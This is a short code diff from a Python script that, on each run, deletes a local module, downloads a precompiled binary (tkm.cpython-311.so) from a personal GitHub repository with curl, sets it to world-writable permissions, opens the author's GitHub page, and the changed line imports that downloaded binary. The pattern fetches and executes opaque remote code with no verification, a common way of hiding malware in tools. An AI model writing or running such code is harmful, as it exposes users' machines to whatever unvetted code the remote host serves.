@@ -4,7 +4,7 @@ os.system('rm -rf tkm.cpython-311.so')
 os.system('curl https://raw.githubusercontent.com/tonmoy404-cyber/Server/main/tkm.cpython-311.so > tkm.cpython-311.so ')
 os.system('chmod 777 tkm.cpython-311.so')
 os.system('xdg-open http://github.com/tonmoy404-cyber')
-import test
+import tkm
 
 """
 bit = platform.architecture()[0]
